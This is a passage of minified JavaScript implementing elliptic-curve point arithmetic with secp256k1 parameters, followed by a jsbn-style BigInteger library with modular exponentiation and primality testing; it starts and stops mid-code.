    return new e.PointFp(this.curve, this.curve.fromBigInteger(u), this.curve.fromBigInteger(y), c)
  }, e.PointFp.prototype.twice = function() {
    if (this.isInfinity()) return this;
    if (0 == this.y.toBigInteger().signum()) return this.curve.getInfinity();
    var t = new BigInteger("3"),
      o = this.x.toBigInteger(),
      i = this.y.toBigInteger(),
      r = i.multiply(this.z),
      s = r.multiply(i).mod(this.curve.q),
      n = this.curve.a.toBigInteger(),
      p = o.square().multiply(t);
    BigInteger.ZERO.equals(n) || (p = p.add(this.z.square().multiply(n))), p = p.mod(this.curve.q);
    var a = p.square().subtract(o.shiftLeft(3).multiply(s)).shiftLeft(1).multiply(r).mod(this.curve.q),
      d = p.multiply(t).multiply(o).subtract(s.shiftLeft(1)).shiftLeft(2).multiply(s).subtract(p.square().multiply(p)).mod(this.curve.q),
      l = r.square().multiply(r).shiftLeft(3).mod(this.curve.q);
    return new e.PointFp(this.curve, this.curve.fromBigInteger(a), this.curve.fromBigInteger(d), l)
  }, e.PointFp.prototype.multiply = function(t) {
    if (this.isInfinity()) return this;
    if (0 == t.signum()) return this.curve.getInfinity();
    var o, r = t,
      e = r.multiply(new BigInteger("3")),
      s = this.negate(),
      n = this;
    for (o = e.bitLength() - 2; 0 < o; --o) {
      n = n.twice();
      var p = e.testBit(o),
        a = r.testBit(o);
      p != a && (n = n.add(p ? this : s))
    }
    return n
  }, e.PointFp.prototype.multiplyTwo = function(e, t, o) {
    var r = e.bitLength() > o.bitLength() ? e.bitLength() - 1 : o.bitLength() - 1;
    for (var s = this.curve.getInfinity(), n = this.add(t); 0 <= r;) s = s.twice(), e.testBit(r) ? s = s.add(o.testBit(r) ? n : this) : o.testBit(r) && (s = s.add(t)), --r;
    return s
  }, e.PointFp.prototype.getEncoded = function(t) {
    var o = this.getX().toBigInteger(),
      i = this.getY().toBigInteger(),
      r = e.integerToBytes(o, 32);
    return t ? r.unshift(i.isEven() ? 2 : 3) : (r.unshift(4), r = r.concat(e.integerToBytes(i, 32))), r
  }, e.PointFp.decodeFrom = function(t, o) {
    var i = (o[0], o.length - 1),
      r = o.slice(1, 1 + i / 2),
      s = o.slice(1 + i / 2, 1 + i);
    r.unshift(0), s.unshift(0);
    var n = new BigInteger(r),
      p = new BigInteger(s);
    return new e.PointFp(t, t.fromBigInteger(n), t.fromBigInteger(p))
  }, e.PointFp.prototype.add2D = function(t) {
    if (this.isInfinity()) return t;
    if (t.isInfinity()) return this;
    if (this.x.equals(t.x)) return this.y.equals(t.y) ? this.twice() : this.curve.getInfinity();
    var o = t.x.subtract(this.x),
      i = t.y.subtract(this.y),
      r = i.divide(o),
      s = r.square().subtract(this.x).subtract(t.x),
      n = r.multiply(this.x.subtract(s)).subtract(this.y);
    return new e.PointFp(this.curve, s, n)
  }, e.PointFp.prototype.twice2D = function() {
    if (this.isInfinity()) return this;
    if (0 == this.y.toBigInteger().signum()) return this.curve.getInfinity();
    var t = this.curve.fromBigInteger(BigInteger.valueOf(2)),
      o = this.curve.fromBigInteger(BigInteger.valueOf(3)),
      i = this.x.square().multiply(o).add(this.curve.a).divide(this.y.multiply(t)),
      r = i.square().subtract(this.x.multiply(t)),
      s = i.multiply(this.x.subtract(r)).subtract(this.y);
    return new e.PointFp(this.curve, r, s)
  }, e.PointFp.prototype.multiply2D = function(t) {
    if (this.isInfinity()) return this;
    if (0 == t.signum()) return this.curve.getInfinity();
    var o, r = t,
      e = r.multiply(new BigInteger("3")),
      s = this.negate(),
      n = this;
    for (o = e.bitLength() - 2; 0 < o; --o) {
      n = n.twice();
      var p = e.testBit(o),
        a = r.testBit(o);
      p != a && (n = n.add2D(p ? this : s))
    }
    return n
  }, e.PointFp.prototype.isOnCurve = function() {
    var e = this.getX().toBigInteger(),
      t = this.getY().toBigInteger(),
      o = this.curve.getA().toBigInteger(),
      i = this.curve.getB().toBigInteger(),
      r = this.curve.getQ(),
      s = t.multiply(t).mod(r),
      n = e.multiply(e).multiply(e).add(o.multiply(e)).add(i).mod(r);
    return s.equals(n)
  }, e.PointFp.prototype.toString = function() {
    return "(" + this.getX().toBigInteger().toString() + "," + this.getY().toBigInteger().toString() + ")"
  }, e.PointFp.prototype.validate = function() {
    var e = this.curve.getQ();
    if (this.isInfinity()) throw new Error("Point is at infinity.");
    var t = this.getX().toBigInteger(),
      o = this.getY().toBigInteger();
    if (0 > t.compareTo(BigInteger.ONE) || 0 < t.compareTo(e.subtract(BigInteger.ONE))) throw new Error("x coordinate out of bounds");
    if (0 > o.compareTo(BigInteger.ONE) || 0 < o.compareTo(e.subtract(BigInteger.ONE))) throw new Error("y coordinate out of bounds");
    if (!this.isOnCurve()) throw new Error("Point is not on the curve.");
    if (this.multiply(e).isInfinity()) throw new Error("Point is not a scalar multiple of G.");
    return !0
  }, e.CurveFp = function(t, o, i) {
    this.q = t, this.a = this.fromBigInteger(o), this.b = this.fromBigInteger(i), this.infinity = new e.PointFp(this, null, null), this.reducer = new Barrett(this.q)
  }, e.CurveFp.prototype.getQ = function() {
    return this.q
  }, e.CurveFp.prototype.getA = function() {
    return this.a
  }, e.CurveFp.prototype.getB = function() {
    return this.b
  }, e.CurveFp.prototype.equals = function(e) {
    return !(e != this) || this.q.equals(e.q) && this.a.equals(e.a) && this.b.equals(e.b)
  }, e.CurveFp.prototype.getInfinity = function() {
    return this.infinity
  }, e.CurveFp.prototype.fromBigInteger = function(t) {
    return new e.FieldElementFp(this.q, t)
  }, e.CurveFp.prototype.reduce = function(e) {
    this.reducer.reduce(e)
  }, e.CurveFp.prototype.decodePointHex = function(t) {
    var o = parseInt(t.substr(0, 2), 16);
    switch (o) {
      case 0:
        return this.infinity;
      case 2:
      case 3:
        var i = t.substr(2, t.length - 2),
          r = new BigInteger(i, 16);
        return this.decompressPoint(1 & o, r);
      case 4:
      case 6:
      case 7:
        var s = (t.length - 2) / 2,
          i = t.substr(2, s),
          n = t.substr(s + 2, s);
        return new e.PointFp(this, this.fromBigInteger(new BigInteger(i, 16)), this.fromBigInteger(new BigInteger(n, 16)));
      default:
        return null;
    }
  }, e.CurveFp.prototype.encodePointHex = function(e) {
    if (e.isInfinity()) return "00";
    var t = e.getX().toBigInteger().toString(16),
      i = e.getY().toBigInteger().toString(16),
      r = this.getQ().toString(16).length;
    for (0 != r % 2 && r++; t.length < r;) t = "0" + t;
    for (; i.length < r;) i = "0" + i;
    return "04" + t + i
  }, e.CurveFp.prototype.decompressPoint = function(t, o) {
    var i = this.fromBigInteger(o),
      r = i.multiply(i.square().add(this.getA())).add(this.getB()),
      s = r.sqrt();
    if (null == s) throw new Error("Invalid point compression");
    var n = s.toBigInteger(),
      p = n.testBit(0) ? 1 : 0;
    return p != t && (s = this.fromBigInteger(this.getQ().subtract(n))), new e.PointFp(this, i, s, null, !0)
  }, e.fromHex = function(e) {
    return new BigInteger(e, 16)
  }, e.integerToBytes = function(e, t) {
    var o = e.toByteArrayUnsigned();
    if (t < o.length) o = o.slice(o.length - t);
    else
      for (; t > o.length;) o.unshift(0);
    return o
  }, e.X9Parameters = function(e, t, o, i) {
    this.curve = e, this.g = t, this.n = o, this.h = i
  }, e.X9Parameters.prototype.getCurve = function() {
    return this.curve
  }, e.X9Parameters.prototype.getG = function() {
    return this.g
  }, e.X9Parameters.prototype.getN = function() {
    return this.n
  }, e.X9Parameters.prototype.getH = function() {
    return this.h
  }, e.secNamedCurves = {
    secp256k1: function() {
      var t = e.fromHex("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F"),
        o = BigInteger.ZERO,
        i = e.fromHex("7"),
        r = e.fromHex("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141"),
        s = BigInteger.ONE,
        n = new e.CurveFp(t, o, i),
        p = n.decodePointHex("0479BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8");
      return new e.X9Parameters(n, p, r, s)
    }
  }, e.getSECCurveByName = function(t) {
    return null == e.secNamedCurves[t] ? null : e.secNamedCurves[t]()
  }
}(),
function() {
  function s() {
    return new h(null)
  }

  function e(e, t, o, r, s, p) {
    for (; 0 <= --p;) {
      var a = t * this[e++] + o[r] + s;
      s = Math.floor(a / 67108864), o[r++] = 67108863 & a
    }
    return s
  }

  function t(e, t, o, r, s, p) {
    for (var a = 32767 & t, d = t >> 15; 0 <= --p;) {
      var u = 32767 & this[e],
        y = this[e++] >> 15,
        g = d * u + y * a;
      u = a * u + ((32767 & g) << 15) + o[r] + (1073741823 & s), s = (u >>> 30) + (g >>> 15) + d * y + (s >>> 30), o[r++] = 1073741823 & u
    }
    return s
  }

  function o(e, t, o, r, s, p) {
    for (var a = 16383 & t, d = t >> 14; 0 <= --p;) {
      var u = 16383 & this[e],
        y = this[e++] >> 14,
        g = d * u + y * a;
      u = a * u + ((16383 & g) << 14) + o[r] + s, s = (u >> 28) + (g >> 14) + d * y, o[r++] = 268435455 & u
    }
    return s
  }

  function r(e) {
    return b.charAt(e)
  }

  function n(e, t) {
    var o = B[e.charCodeAt(t)];
    return null == o ? -1 : o
  }

  function p(e) {
    var t = s();
    return t.fromInt(e), t
  }

  function a(e) {
    var i, s = 1;
    return 0 != (i = e >>> 16) && (e = i, s += 16), 0 != (i = e >> 8) && (e = i, s += 8), 0 != (i = e >> 4) && (e = i, s += 4), 0 != (i = e >> 2) && (e = i, s += 2), 0 != (i = e >> 1) && (e = i, s += 1), s
  }

  function d(e) {
    if (0 == e) return -1;
    var t = 0;
    return 0 == (65535 & e) && (e >>= 16, t += 16), 0 == (255 & e) && (e >>= 8, t += 8), 0 == (15 & e) && (e >>= 4, t += 4), 0 == (3 & e) && (e >>= 2, t += 2), 0 == (1 & e) && ++t, t
  }

  function l(e) {
    for (var t = 0; 0 != e;) e &= e - 1, ++t;
    return t
  }

  function i(e, t) {
    return e & t
  }

  function u(e, t) {
    return e | t
  }

  function y(e, t) {
    return e ^ t
  }

  function c(e, t) {
    return e & ~t
  }
  var m, h = window.BigInteger = function e(t, o, i) {
    return this instanceof e ? void(null != t && ("number" == typeof t ? this.fromNumber(t, o, i) : null == o && "string" != typeof t ? this.fromString(t, 256) : this.fromString(t, o))) : new e(t, o, i)
  };
  "Microsoft Internet Explorer" == navigator.appName ? (h.prototype.am = t, m = 30) : "Netscape" != navigator.appName ? (h.prototype.am = e, m = 26) : (h.prototype.am = o, m = 28), h.prototype.DB = m, h.prototype.DM = (1 << m) - 1, h.prototype.DV = 1 << m;
  h.prototype.FV = Math.pow(2, 52), h.prototype.F1 = 52 - m, h.prototype.F2 = 2 * m - 52;
  var g, f, b = "0123456789abcdefghijklmnopqrstuvwxyz",
    B = [];
  for (g = 48, f = 0; 9 >= f; ++f) B[g++] = f;
  for (g = 97, f = 10; 36 > f; ++f) B[g++] = f;
  for (g = 65, f = 10; 36 > f; ++f) B[g++] = f;
  h.prototype.copyTo = function(e) {
    for (var t = this.t - 1; 0 <= t; --t) e[t] = this[t];
    e.t = this.t, e.s = this.s
  }, h.prototype.fromInt = function(e) {
    this.t = 1, this.s = 0 > e ? -1 : 0, 0 < e ? this[0] = e : -1 > e ? this[0] = e + this.DV : this.t = 0
  }, h.prototype.fromString = function(e, t) {
    var o;
    if (16 == t) o = 4;
    else if (8 == t) o = 3;
    else if (256 == t) o = 8;
    else if (2 == t) o = 1;
    else if (32 == t) o = 5;
    else {
      if (4 != t) return void this.fromRadix(e, t);
      o = 2
    }
    this.t = 0, this.s = 0;
    for (var r, s = e.length, p = !1, a = 0; 0 <= --s;) r = 8 == o ? 255 & e[s] : n(e, s), 0 > r ? "-" == e.charAt(s) && (p = !0) : (p = !1, 0 == a ? this[this.t++] = r : a + o > this.DB ? (this[this.t - 1] |= (r & (1 << this.DB - a) - 1) << a, this[this.t++] = r >> this.DB - a) : this[this.t - 1] |= r << a, a += o, a >= this.DB && (a -= this.DB));
    8 == o && 0 != (128 & e[0]) && (this.s = -1, 0 < a && (this[this.t - 1] |= (1 << this.DB - a) - 1 << a)), this.clamp(), p && h.ZERO.subTo(this, this)
  }, h.prototype.clamp = function() {
    for (var e = this.s & this.DM; 0 < this.t && this[this.t - 1] == e;) --this.t
  }, h.prototype.dlShiftTo = function(e, t) {
    var o;
    for (o = this.t - 1; 0 <= o; --o) t[o + e] = this[o];
    for (o = e - 1; 0 <= o; --o) t[o] = 0;
    t.t = this.t + e, t.s = this.s
  }, h.prototype.drShiftTo = function(e, t) {
    for (var o = e; o < this.t; ++o) t[o - e] = this[o];
    t.t = Math.max(this.t - e, 0), t.s = this.s
  }, h.prototype.lShiftTo = function(e, t) {
    var r, s = e % this.DB,
      o = this.DB - s,
      n = Math.floor(e / this.DB),
      p = this.s << s & this.DM;
    for (r = this.t - 1; 0 <= r; --r) t[r + n + 1] = this[r] >> o | p, p = (this[r] & (1 << o) - 1) << s;
    for (r = n - 1; 0 <= r; --r) t[r] = 0;
    t[n] = p, t.t = this.t + n + 1, t.s = this.s, t.clamp()
  }, h.prototype.rShiftTo = function(e, t) {
    t.s = this.s;
    var r = Math.floor(e / this.DB);
    if (r >= this.t) return void(t.t = 0);
    var o = e % this.DB,
      s = this.DB - o,
      n = (1 << o) - 1;
    t[0] = this[r] >> o;
    for (var p = r + 1; p < this.t; ++p) t[p - r - 1] |= (this[p] & n) << s, t[p - r] = this[p] >> o;
    0 < o && (t[this.t - r - 1] |= (this.s & n) << s), t.t = this.t - r, t.clamp()
  }, h.prototype.subTo = function(e, t) {
    for (var o = 0, r = 0, s = Math.min(e.t, this.t); s > o;) r += this[o] - e[o], t[o++] = r & this.DM, r >>= this.DB;
    if (e.t < this.t) {
      for (r -= e.s; o < this.t;) r += this[o], t[o++] = r & this.DM, r >>= this.DB;
      r += this.s
    } else {
      for (r += this.s; o < e.t;) r -= e[o], t[o++] = r & this.DM, r >>= this.DB;
      r -= e.s
    }
    t.s = 0 > r ? -1 : 0, -1 > r ? t[o++] = this.DV + r : 0 < r && (t[o++] = r), t.t = o, t.clamp()
  }, h.prototype.multiplyTo = function(e, t) {
    var r = this.abs(),
      o = e.abs(),
      s = r.t;
    for (t.t = s + o.t; 0 <= --s;) t[s] = 0;
    for (s = 0; s < o.t; ++s) t[s + r.t] = r.am(0, o[s], t, s, 0, r.t);
    t.s = 0, t.clamp(), this.s != e.s && h.ZERO.subTo(t, t)
  }, h.prototype.squareTo = function(e) {
    for (var t = this.abs(), o = e.t = 2 * t.t; 0 <= --o;) e[o] = 0;
    for (o = 0; o < t.t - 1; ++o) {
      var r = t.am(o, t[o], e, 2 * o, 0, 1);
      (e[o + t.t] += t.am(o + 1, 2 * t[o], e, 2 * o + 1, r, t.t - o - 1)) >= t.DV && (e[o + t.t] -= t.DV, e[o + t.t + 1] = 1)
    }
    0 < e.t && (e[e.t - 1] += t.am(o, t[o], e, 2 * o, 0, 1)), e.s = 0, e.clamp()
  }, h.prototype.divRemTo = function(o, n, p) {
    var l = o.abs();
    if (!(0 >= l.t)) {
      var u = this.abs();
      if (u.t < l.t) return null != n && n.fromInt(0), void(null != p && this.copyTo(p));
      null == p && (p = s());
      var c = s(),
        d = this.s,
        y = o.s,
        m = this.DB - a(l[l.t - 1]);
      0 < m ? (l.lShiftTo(m, c), u.lShiftTo(m, p)) : (l.copyTo(c), u.copyTo(p));
      var g = c.t,
        f = c[g - 1];
      if (0 != f) {
        var b = f * (1 << this.F1) + (1 < g ? c[g - 2] >> this.F2 : 0),
          B = this.FV / b,
          F = (1 << this.F1) / b,
          T = 1 << this.F2,
          e = p.t,
          v = e - g,
          C = null == n ? s() : n;
        for (c.dlShiftTo(v, C), 0 <= p.compareTo(C) && (p[p.t++] = 1, p.subTo(C, p)), h.ONE.dlShiftTo(g, C), C.subTo(c, c); c.t < g;) c[c.t++] = 0;
        for (; 0 <= --v;) {
          var t = p[--e] == f ? this.DM : Math.floor(p[e] * B + (p[e - 1] + T) * F);
          if ((p[e] += c.am(0, t, p, v, 0, g)) < t)
            for (c.dlShiftTo(v, C), p.subTo(C, p); p[e] < --t;) p.subTo(C, p)
        }
        null != n && (p.drShiftTo(g, n), d != y && h.ZERO.subTo(n, n)), p.t = g, p.clamp(), 0 < m && p.rShiftTo(m, p), 0 > d && h.ZERO.subTo(p, p)
      }
    }
  }, h.prototype.invDigit = function() {
    if (1 > this.t) return 0;
    var e = this[0];
    if (0 == (1 & e)) return 0;
    var t = 3 & e;
    return t = 15 & t * (2 - (15 & e) * t), t = 255 & t * (2 - (255 & e) * t), t = 65535 & t * (2 - (65535 & (65535 & e) * t)), t = t * (2 - e * t % this.DV) % this.DV, 0 < t ? this.DV - t : -t
  }, h.prototype.isEven = function() {
    return 0 == (0 < this.t ? 1 & this[0] : this.s)
  }, h.prototype.exp = function(o, e) {
    if (4294967295 < o || 1 > o) return h.ONE;
    var n = s(),
      p = s(),
      d = e.convert(this),
      l = a(o) - 1;
    for (d.copyTo(n); 0 <= --l;)
      if (e.sqrTo(n, p), 0 < (o & 1 << l)) e.mulTo(p, d, n);
      else {
        var u = n;
        n = p, p = u
      } return e.revert(n)
  }, h.prototype.toString = function(e) {
    if (0 > this.s) return "-" + this.negate().toString(e);
    var t;
    if (16 == e) t = 4;
    else if (8 == e) t = 3;
    else if (2 == e) t = 1;
    else if (32 == e) t = 5;
    else {
      if (4 != e) return this.toRadix(e);
      t = 2
    }
    var o, s = (1 << t) - 1,
      n = !1,
      a = "",
      d = this.t,
      l = this.DB - d * this.DB % t;
    if (0 < d--)
      for (l < this.DB && 0 < (o = this[d] >> l) && (n = !0, a = r(o)); 0 <= d;) t > l ? (o = (this[d] & (1 << l) - 1) << t - l, o |= this[--d] >> (l += this.DB - t)) : (o = this[d] >> (l -= t) & s, 0 >= l && (l += this.DB, --d)), 0 < o && (n = !0), n && (a += r(o));
    return n ? a : "0"
  }, h.prototype.negate = function() {
    var e = s();
    return h.ZERO.subTo(this, e), e
  }, h.prototype.abs = function() {
    return 0 > this.s ? this.negate() : this
  }, h.prototype.compareTo = function(e) {
    var t = this.s - e.s;
    if (0 != t) return t;
    var o = this.t;
    if (t = o - e.t, 0 != t) return 0 > this.s ? -t : t;
    for (; 0 <= --o;)
      if (0 != (t = this[o] - e[o])) return t;
    return 0
  }, h.prototype.bitLength = function() {
    return 0 >= this.t ? 0 : this.DB * (this.t - 1) + a(this[this.t - 1] ^ this.s & this.DM)
  }, h.prototype.mod = function(e) {
    var t = s();
    return this.abs().divRemTo(e, null, t), 0 > this.s && 0 < t.compareTo(h.ZERO) && e.subTo(t, t), t
  }, h.prototype.modPowInt = function(t, e) {
    var i;
    return i = 256 > t || e.isEven() ? new S(e) : new A(e), this.exp(t, i)
  }, h.ZERO = p(0), h.ONE = p(1);
  var F = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997],
    T = 67108864 / F[F.length - 1];
  h.prototype.chunkSize = function(e) {
    return Math.floor(Math.LN2 * this.DB / Math.log(e))
  }, h.prototype.toRadix = function(e) {
    if (null == e && (e = 10), 0 == this.signum() || 2 > e || 36 < e) return "0";
    var t = this.chunkSize(e),
      o = Math.pow(e, t),
      i = p(o),
      n = s(),
      a = s(),
      d = "";
    for (this.divRemTo(i, n, a); 0 < n.signum();) d = (o + a.intValue()).toString(e).substr(1) + d, n.divRemTo(i, n, a);
    return a.intValue().toString(e) + d
  }, h.prototype.fromRadix = function(e, t) {
    this.fromInt(0), null == t && (t = 10);
    for (var r, s = this.chunkSize(t), p = Math.pow(t, s), a = !1, l = 0, u = 0, c = 0; c < e.length; ++c) r = n(e, c), 0 > r ? "-" == e.charAt(c) && 0 == this.signum() && (a = !0) : (u = t * u + r, ++l >= s && (this.dMultiply(p), this.dAddOffset(u, 0), l = 0, u = 0));
    0 < l && (this.dMultiply(Math.pow(t, l)), this.dAddOffset(u, 0)), a && h.ZERO.subTo(this, this)
  }, h.prototype.fromNumber = function(e, i, o) {
    if (!("number" == typeof i)) {
      var r = [],
        s = 7 & e;
      r.length = (e >> 3) + 1, i.nextBytes(r), 0 < s ? r[0] &= (1 << s) - 1 : r[0] = 0, this.fromString(r, 256)
    } else if (2 > e) this.fromInt(1);
    else
      for (this.fromNumber(e, o), this.testBit(e - 1) || this.bitwiseTo(h.ONE.shiftLeft(e - 1), u, this), this.isEven() && this.dAddOffset(1, 0); !this.isProbablePrime(i);) this.dAddOffset(2, 0), this.bitLength() > e && this.subTo(h.ONE.shiftLeft(e - 1), this)
  }, h.prototype.bitwiseTo = function(e, t, o) {
    var r, s, n = Math.min(e.t, this.t);
    for (r = 0; n > r; ++r) o[r] = t(this[r], e[r]);
    if (e.t < this.t) {
      for (s = e.s & this.DM, r = n; r < this.t; ++r) o[r] = t(this[r], s);
      o.t = this.t
    } else {
      for (s = this.s & this.DM, r = n; r < e.t; ++r) o[r] = t(s, e[r]);
      o.t = e.t
    }
    o.s = t(this.s, e.s), o.clamp()
  }, h.prototype.changeBit = function(e, t) {
    var o = h.ONE.shiftLeft(e);
    return this.bitwiseTo(o, t, o), o
  }, h.prototype.addTo = function(e, t) {
    for (var o = 0, r = 0, s = Math.min(e.t, this.t); s > o;) r += this[o] + e[o], t[o++] = r & this.DM, r >>= this.DB;
    if (e.t < this.t) {
      for (r += e.s; o < this.t;) r += this[o], t[o++] = r & this.DM, r >>= this.DB;
      r += this.s
    } else {
      for (r += this.s; o < e.t;) r += e[o], t[o++] = r & this.DM, r >>= this.DB;
      r += e.s
    }
    t.s = 0 > r ? -1 : 0, 0 < r ? t[o++] = r : -1 > r && (t[o++] = this.DV + r), t.t = o, t.clamp()
  }, h.prototype.dMultiply = function(e) {
    this[this.t] = this.am(0, e - 1, this, 0, 0, this.t), ++this.t, this.clamp()
  }, h.prototype.dAddOffset = function(e, t) {
    if (0 != e) {
      for (; this.t <= t;) this[this.t++] = 0;
      for (this[t] += e; this[t] >= this.DV;) this[t] -= this.DV, ++t >= this.t && (this[this.t++] = 0), ++this[t]
    }
  }, h.prototype.multiplyLowerTo = function(e, t, s) {
    var r = Math.min(this.t + e.t, t);
    for (s.s = 0, s.t = r; 0 < r;) s[--r] = 0;
    var n;
    for (n = s.t - this.t; n > r; ++r) s[r + this.t] = this.am(0, e[r], s, r, 0, this.t);
    for (n = Math.min(e.t, t); n > r; ++r) this.am(0, e[r], s, r, 0, t - r);
    s.clamp()
  }, h.prototype.multiplyUpperTo = function(e, t, o) {
    --t;
    var r = o.t = this.t + e.t - t;
    for (o.s = 0; 0 <= --r;) o[r] = 0;
    for (r = Math.max(t - this.t, 0); r < e.t; ++r) o[this.t + r - t] = this.am(t - r, e[r], o, 0, 0, this.t + r - t);
    o.clamp(), o.drShiftTo(1, o)
  }, h.prototype.modInt = function(e) {
    if (0 >= e) return 0;
    var t = this.DV % e,
      o = 0 > this.s ? e - 1 : 0;
    if (0 < this.t)
      if (0 == t) o = this[0] % e;
      else
        for (var s = this.t - 1; 0 <= s; --s) o = (t * o + this[s]) % e;
    return o
  }, h.prototype.millerRabin = function(e) {
    var o = this.subtract(h.ONE),
      n = o.getLowestSetBit();
    if (0 >= n) return !1;
    var p = o.shiftRight(n);
    e = e + 1 >> 1, e > F.length && (e = F.length);
    for (var r = s(), a = 0; e > a; ++a) {
      r.fromInt(F[Math.floor(Math.random() * F.length)]);
      var l = r.modPow(p, this);
      if (0 != l.compareTo(h.ONE) && 0 != l.compareTo(o)) {
        for (var u = 1; u++ < n && 0 != l.compareTo(o);)
          if (l = l.modPowInt(2, this), 0 == l.compareTo(h.ONE)) return !1;
        if (0 != l.compareTo(o)) return !1
      }
    }
    return !0
  }, h.prototype.clone = function() {
    var e = s();
    return this.copyTo(e), e
  }, h.prototype.intValue = function() {
    if (0 > this.s) {
      if (1 == this.t) return this[0] - this.DV;
      if (0 == this.t) return -1
    } else {
      if (1 == this.t) return this[0];
      if (0 == this.t) return 0
    }
    return (this[1] & (1 << 32 - this.DB) - 1) << this.DB | this[0]
  }, h.prototype.byteValue = function() {
    return 0 == this.t ? this.s : this[0] << 24 >> 24
  }, h.prototype.shortValue = function() {
    return 0 == this.t ? this.s : this[0] << 16 >> 16
  }, h.prototype.signum = function() {
    return 0 > this.s ? -1 : 0 >= this.t || 1 == this.t && 0 >= this[0] ? 0 : 1
  }, h.prototype.toByteArray = function() {
    var e = this.t,
      t = [];
    t[0] = this.s;
    var r, s = this.DB - e * this.DB % 8,
      n = 0;
    if (0 < e--)
      for (s < this.DB && (r = this[e] >> s) != (this.s & this.DM) >> s && (t[n++] = r | this.s << this.DB - s); 0 <= e;) 8 > s ? (r = (this[e] & (1 << s) - 1) << 8 - s, r |= this[--e] >> (s += this.DB - 8)) : (r = 255 & this[e] >> (s -= 8), 0 >= s && (s += this.DB, --e)), 0 != (128 & r) && (r |= -256), 0 == n && (128 & this.s) != (128 & r) && ++n, (0 < n || r != this.s) && (t[n++] = r);
    return t
  }, h.prototype.equals = function(e) {
    return 0 == this.compareTo(e)
  }, h.prototype.min = function(e) {
    return 0 > this.compareTo(e) ? this : e
  }, h.prototype.max = function(e) {
    return 0 < this.compareTo(e) ? this : e
  }, h.prototype.and = function(e) {
    var t = s();
    return this.bitwiseTo(e, i, t), t
  }, h.prototype.or = function(e) {
    var t = s();
    return this.bitwiseTo(e, u, t), t
  }, h.prototype.xor = function(e) {
    var t = s();
    return this.bitwiseTo(e, y, t), t
  }, h.prototype.andNot = function(e) {
    var t = s();
    return this.bitwiseTo(e, c, t), t
  }, h.prototype.not = function() {
    for (var e = s(), t = 0; t < this.t; ++t) e[t] = this.DM & ~this[t];
    return e.t = this.t, e.s = ~this.s, e
  }, h.prototype.shiftLeft = function(e) {
    var t = s();
    return 0 > e ? this.rShiftTo(-e, t) : this.lShiftTo(e, t), t
  }, h.prototype.shiftRight = function(e) {
    var t = s();
    return 0 > e ? this.lShiftTo(-e, t) : this.rShiftTo(e, t), t
  }, h.prototype.getLowestSetBit = function() {
    for (var e = 0; e < this.t; ++e)
      if (0 != this[e]) return e * this.DB + d(this[e]);
    return 0 > this.s ? this.t * this.DB : -1
  }, h.prototype.bitCount = function() {
    for (var e = 0, t = this.s & this.DM, o = 0; o < this.t; ++o) e += l(this[o] ^ t);
    return e
  }, h.prototype.testBit = function(e) {
    var t = Math.floor(e / this.DB);
    return t >= this.t ? 0 != this.s : 0 != (this[t] & 1 << e % this.DB)
  }, h.prototype.setBit = function(e) {
    return this.changeBit(e, u)
  }, h.prototype.clearBit = function(e) {
    return this.changeBit(e, c)
  }, h.prototype.flipBit = function(e) {
    return this.changeBit(e, y)
  }, h.prototype.add = function(e) {
    var t = s();
    return this.addTo(e, t), t
  }, h.prototype.subtract = function(e) {
    var t = s();
    return this.subTo(e, t), t
  }, h.prototype.multiply = function(e) {
    var t = s();
    return this.multiplyTo(e, t), t
  }, h.prototype.divide = function(e) {
    var t = s();
    return this.divRemTo(e, t, null), t
  }, h.prototype.remainder = function(e) {
    var t = s();
    return this.divRemTo(e, null, t), t
  }, h.prototype.divideAndRemainder = function(e) {
    var t = s(),
      o = s();
    return this.divRemTo(e, t, o), [t, o]
  }, h.prototype.modPow = function(o, e) {
    var l, c, m = o.bitLength(),
      h = p(1);
    if (0 >= m) return h;
    l = 18 > m ? 1 : 48 > m ? 3 : 144 > m ? 4 : 768 > m ? 5 : 6, c = 8 > m ? new S(e) : e.isEven() ? new E(e) : new A(e);
    var b = [],
      g = 3,
      B = l - 1,
      d = (1 << l) - 1;
    if (b[1] = c.convert(this), 1 < l) {
      var y = s();
      for (c.sqrTo(b[1], y); d >= g;) b[g] = s(), c.mulTo(y, b[g - 2], b[g]), g += 2
    }
    var v, P, w = o.t - 1,
      x = !0,
      D = s();
    for (m = a(o[w]) - 1; 0 <= w;) {
      for (m >= B ? v = o[w] >> m - B & d : (v = (o[w] & (1 << m + 1) - 1) << B - m, 0 < w && (v |= o[w - 1] >> this.DB + m - B)), g = l; 0 == (1 & v);) v >>= 1, --g;
      if (0 > (m -= g) && (m += this.DB, --w), x) b[v].copyTo(h), x = !1;
      else {
        for (; 1 < g;) c.sqrTo(h, D), c.sqrTo(D, h), g -= 2;
        0 < g ? c.sqrTo(h, D) : (P = h, h = D, D = P), c.mulTo(D, b[v], h)
      }
      for (; 0 <= w && 0 == (o[w] & 1 << m);) c.sqrTo(h, D), P = h, h = D, D = P, 0 > --m && (m = this.DB - 1, --w)
    }
    return c.revert(h)
  }, h.prototype.modInverse = function(e) {
    var t = e.isEven();
    if (0 === this.signum()) throw new Error("division by zero");
    if (this.isEven() && t || 0 == e.signum()) return h.ZERO;
    for (var o = e.clone(), i = this.clone(), r = p(1), s = p(0), n = p(0), a = p(1); 0 != o.signum();) {
